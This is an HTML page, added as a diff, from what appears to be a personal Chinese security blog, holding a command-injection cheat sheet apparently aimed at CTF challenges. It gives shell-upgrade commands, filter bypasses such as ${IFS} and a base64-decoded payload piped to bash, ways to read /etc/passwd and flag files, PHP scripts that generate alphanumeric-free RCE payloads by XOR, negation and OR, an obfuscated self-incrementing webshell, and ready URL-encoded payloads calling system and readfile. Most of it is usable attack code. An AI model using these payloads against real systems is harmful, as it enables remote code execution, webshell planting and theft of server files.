@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>命令注入 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u547d\u4ee4\u6ce8\u5165", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "Tool", url: "#tool" },
+              {title: "shell \u5347\u7ea7", url: "#shell" },
+              {title: "Bypass", url: "#bypass" },
+              {title: "PHP Bypass", url: "#php-bypass" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/" class="btn btn-xs btn-link">
+        社工👖
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" class="btn btn-xs btn-link">
+        js前端加密
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">命令注入</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#Tool">Tool</a></li>
+<li><a href="#shell-升级">shell 升级</a></li>
+<li><a href="#Bypass">Bypass</a><ul>
+<li><a href="#通用型">通用型</a></li>
+<li><a href="#空格">空格</a></li>
+<li><a href="#">&amp;,|</a></li>
+<li><a href="#斜杠">斜杠</a></li>
+<li><a href="#关键字">关键字</a></li>
+</ul>
+</li>
+<li><a href="#PHP-Bypass">PHP Bypass</a><ul>
+<li><a href="#无字母数字RCERCEME">无字母数字RCE（RCEME）</a><ul>
+<li><a href="#异或">异或</a></li>
+<li><a href="#取反">取反</a></li>
+<li><a href="#自增">自增</a></li>
+<li><a href="#或运算">或运算</a></li>
+<li><a href="#骚payload">骚payload</a></li>
+</ul>
+</li>
+<li><a href="#下划线">下划线</a></li>
+<li><a href="#分号">分号</a></li>
+<li><a href="#符">\$符</a></li>
+<li><a href="#php5和7的区别">php5和7的区别</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="tool">Tool</h2>
+<p>反弹shell生成</p>
+<p><a href="https://www.ddosi.org/shell/" title="https://www.ddosi.org/shell/">https://www.ddosi.org/shell/</a></p>
+<h2 id="shell">shell 升级</h2>
+<pre><code class="language-纯文本">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' 
+python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' 
+
+</code></pre>
+<p>完全交互式</p>
+<pre><code class="language-纯文本">$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+Ctrl-Z
+$ stty raw -echo
+$ fg
+$ reset
+$ export SHELL=bash
+//$ export TERM=xterm-256color
+</code></pre>
+<h2 id="bypass">Bypass</h2>
+<h3 id="_3">通用型</h3>
+<p>空格，敏感字符 bypass
+需要echo，｜，bash，base64存在</p>
+<pre><code class="language-纯文本">echo${IFS}&quot;[ PAYLOAD ]&quot;|base64${IFS}-d|bash
+
+</code></pre>
+<pre><code class="language-纯文本">${printf &quot;\xaa&quot;} 十六进制绕过
+${printf &quot;\144\121&quot;} 八进制绕过
+
+读文件cat之类的被ban了
+curl file:///flag
+strings /flag
+uniq -c/etc/passwd
+bash -v /etc/passwd
+rev /etc/passwd
+</code></pre>
+<h3 id="_4">空格</h3>
+<pre><code class="language-纯文本">$&lt;符号
+$IFS
+${IFS}
+$IFS$9
+%09 用于url传递 %0a %0d也可以
+cat&lt;/flag
+{cat,flag}
+&lt;&gt;（cat&lt;&gt;/flag）
+&lt;（cat&lt;/flag）
+
+</code></pre>
+<h3 id="_5">&amp;,|</h3>
+<h3 id="_6">斜杠</h3>
+<pre><code class="language-纯文本">通过环境变量拿/
+假设我们定义了一个变量为：
+file=/dir1/dir2/dir3/my.file.txt
+我们可以用 ${ } 分别替换获得不同的值：
+${file#*/}：拿掉第一条 / 及其左边的字串：dir1/dir2/dir3/my.file.txt
+${file##*/}：拿掉最后一条 / 及其左边的字串：my.file.txt
+${file#*.}：拿掉第一个 . 及其左边的字串：file.txt
+${file##*.}：拿掉最后一个 . 及其左边的字串：txt
+${file%/*}：拿掉最后条 / 及其右边的字串：/dir1/dir2/dir3
+${file%%/*}：拿掉第一条 / 及其右边的字串：(空值)
+${file%.*}：拿掉最后一个 . 及其右边的字串：/dir1/dir2/dir3/my.file
+${file%%.*}：拿掉第一个 . 及其右边的字串：/dir1/dir2/dir3/my
+
+使用；执行多条命令
+cd flag_dir;cat flag
+</code></pre>
+<h3 id="_7">关键字</h3>
+<pre><code class="language-纯文本">flag  -&gt; fla''g  fla&quot;&quot;g  fla\g  
+
+拼接绕过
+a=fl;b=ag;cat $a$b
+
+</code></pre>
+<h2 id="php-bypass">PHP Bypass</h2>
+<h3 id="rcerceme">无字母数字RCE（RCEME）</h3>
+<h4 id="_8">异或</h4>
+<p>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，所以说当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong>。</p>
+<p>构造脚本</p>
+<p>生成字母表的php文件</p>
+<pre><code class="language-纯文本">&lt;?php
+
+$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);
+$contents=&quot;&quot;;
+for ($i=0; $i &lt; 256; $i++) { 
+for ($j=0; $j &lt;256 ; $j++) { 
+​
+if($i&lt;16){
+$hex_i='0'.dechex($i);
+}
+else{
+$hex_i=dechex($i);
+}
+if($j&lt;16){
+$hex_j='0'.dechex($j);
+}
+else{
+$hex_j=dechex($j);
+}
+$preg = '/[a-z0-9]/i';    // 根据题目给的正则表达式修改即可
+if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+echo &quot;&quot;;
+}
+​
+else{
+$a='%'.$hex_i;
+$b='%'.$hex_j;
+$c=(urldecode($a)^urldecode($b));
+if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {
+$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
+}
+}
+​
+}
+}
+fwrite($myfile,$contents);
+fclose($myfile);
+</code></pre>
+<p>根据字母表来生成payload的python</p>
+<pre><code class="language-纯文本"># -*- coding: utf-8 -*-
+
+def action(arg):
+s1=&quot;&quot;
+s2=&quot;&quot;
+for i in arg:
+f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)
+while True:
+t=f.readline()
+if t==&quot;&quot;:
+break
+if t[0]==i:
+#print(i)
+s1+=t[2:5]
+s2+=t[6:9]
+break
+f.close()
+output=&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;
+return(output)
+
+while True:
+param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;
+print(param)
+</code></pre>
+<p><img alt="" src="../image/image_uMKc8WQRVC.png" /></p>
+<p><img alt="" src="../image/image_1oq_Z6ve2b.png" /></p>
+<h4 id="_9">取反</h4>
+<pre><code class="language-纯文本">&lt;?php
+//在命令行中运行
+
+fwrite(STDOUT,'[+]your function: ');
+
+$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); 
+
+fwrite(STDOUT,'[+]your command: ');
+
+$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); 
+
+echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
+</code></pre>
+<p><img alt="" src="../image/image_dgwKYKzMdl.png" /></p>
+<h4 id="_10">自增</h4>
+<p>webshell，记得urlencode</p>
+<pre><code class="language-纯文本">$_=[];$_=@&quot;$_&quot;;$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
+</code></pre>
+<p><img alt="" src="../image/image_x6nEV_MEaG.png" /></p>
+<h4 id="_11">或运算</h4>
+<p>脚本</p>
+<pre><code class="language-纯文本">import re
+from urllib.parse import unquote
+import requests
+
+preg = '[0-9a-z]'#(\^)(\+)(\~)(\$)(\[)(\])(\{)(\})(\&amp;)(\-)]'可以自己改正则
+filename = 'Or.txt'
+
+with open(filename, &quot;w&quot;) as file_ob:
+    pass
+
+for i in range(256):
+    if re.match(preg,chr(i),re.I):
+        continue
+    for j in range(256):
+        if re.match(preg,chr(j),re.I):
+            continue
+        else:
+            if(i &lt; 16):
+                hexI = '%0' + hex(i)[2:]
+            else:
+                hexI = '%' + hex(i)[2:]
+            if(j &lt; 16):
+                hexJ = '%0' + hex(j)[2:]
+            else:
+                hexJ = '%' + hex(j)[2:]  
+            if((i|j) &gt;= 32 and (i|j) &lt;= 126):
+                #print(chr(i) + '|'+ chr(j) + &quot; = &quot; + chr(i|j) + '--------' , i ,'|' , j , '=' , (i|j))
+                with open(filename, &quot;a&quot;) as file_ob:
+                    file_ob.write(hexI + '|'+ hexJ + &quot;=&quot; + str(chr(i|j)) 
+                    + '--------' + str(i) + '|' + str(j) + '=' + str((i|j)) + &quot;\n&quot;)
+
+def rep(args):
+    payload = ''
+    payload1 = ''
+    payload2 = ''
+    with open(filename) as file_ob:
+        lines = file_ob.readlines()
+    for i in args:
+        for line in lines:
+            #print(line)
+            if line[8] == i:
+                #print('(\&quot;'+ line[:3] + '\&quot;|\&quot;' + line[4:7] + '\&quot;)', end = &quot;&quot;)
+                payload1 += line[:3]  
+                payload2 += line[4:7] 
+                break
+    #print(payload)
+    payload = '\&quot;' + payload1 + '\&quot;|\&quot;'+ payload2 + '\&quot;' 
+    return payload
+
+running = True
+while running:
+    exp = rep(input(&quot;your payload:\n&quot;))
+    print(&quot;URL编码&quot;,exp)
+    print(&quot;无URL编码&quot;,unquote(exp))
+    #url = 'http://' 
+    #data = {'c': unquote(exp)}
+    #headers = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
+    #r = requests.post(url, data = data)
+    print(&quot;-------------结果--------------&quot;)
+    #print(r.text)
+    print(&quot;\n&quot;)
+</code></pre>
+<p>比如想执行system("ls /") 就得这样</p>
+<p><img alt="" src="../image/image_kluiG0euBi.png" /></p>
+<h4 id="payload">骚payload</h4>
+<pre><code class="language-纯文本">${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff^%88%97%90%9E%92%96);&amp;%ff=system
+${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&amp;%ff=readfile
+${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&amp;%ff=highlight_file
+
+// 即: 
+// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('whoami');&amp;%ff=system
+// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&amp;%ff=readfile
+// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&amp;%ff=highlight_file
+
+${%ff%ff%ff%ff^%a0%b8%ba%ab} 代表${_GET}:
+${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo
+即: 
+${_GET}{%ff}();&amp;%ff=phpinfo
+//?shell=${_GET}{%ff}();&amp;%ff=phpinfo
+
+</code></pre>
+<p><img alt="" src="../image/image_kRK0W1TEW4.png" /></p>
+<p>同理也可以取反</p>
+<pre><code class="language-纯文本">${~%A0%B8%BA%AB}{%ff}();&amp;%ff=phpinfo
+${~%A0%B8%BA%AB}{%ff}(~%88%97%90%9E%92%96);&amp;%ff=system //system('whoami')
+</code></pre>
+<p>也可以用反引号加短标签</p>
+<pre><code class="language-纯文本">?&gt;&lt;?=`{${~%A0%B8%BA%AB}{%ff}}`?&gt;&amp;%ff=ls /
+即: 
+?&gt;&lt;?=`$_GET[%ff]`?&gt;&amp;%ff=ls /
+最开头的?&gt;闭合了 eval() 函数自带的&lt;?标签。接下来使用了短标签代替&lt;?php echo ... ?&gt;。{}里面包含的 PHP 代码可以被执行，~%A0%B8%BA%AB为_GET，最后将通过参数%ff传入的值使用反引号进行命令执行。
+</code></pre>
+<h3 id="_12">下划线</h3>
+<p>简单，我们上面有很多payload压根就没用到_</p>
+<h3 id="_13">分号</h3>
+<p>无需担心，前面我们已经说了，PHP 短标签中的代码不需要写分号，所以我们直接把所有的 PHP 语句改成短标签形式就行了。</p>
+<pre><code class="language-纯文本">&lt;?=echo (1)?&gt;
+</code></pre>
+<h3 id="_14">\$符</h3>
+<p>如果php7以上，可以用或运算或者异或来绕过，因为其payload里没\$符。原因是php7中，我们可以使用(\$a)()这种方法来执行命令</p>
+<p>在 PHP 5 中如果我们还使用<code>('phpinfo')();</code>这样的 PHP 表达式则会得到一个报错，原因就是 PHP 5 并不支持这种表达方式。所以，如果也过滤了<code>$</code>的话，对于 PHP 5 环境的利用方法就很复杂了。</p>
+<h3 id="php57">php5和7的区别</h3>
+<p>在研究无数字字母rce的过程中，一个很重要的函数就是<code>assert</code>，但在php5的版本和php7的版本中，它是有一些区别的，我们上面的测试都是基于php5进行的，在php5中assert是一个函数，我们可以通过<code>$f='assert';$f(...);</code>这样的方法来动态执行任意代码，在php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码</p>
+<p>但是在php7中，我们可以使用(\$a)()这种方法来执行命令，那相当于我们对phpinfo取反后就可以直接执行了，也可以选择file_put_contents()来写入shell，在php5中这样是不行的：</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/" class="btn btn-xs btn-link">
+        社工👖
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" class="btn btn-xs btn-link">
+        js前端加密
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
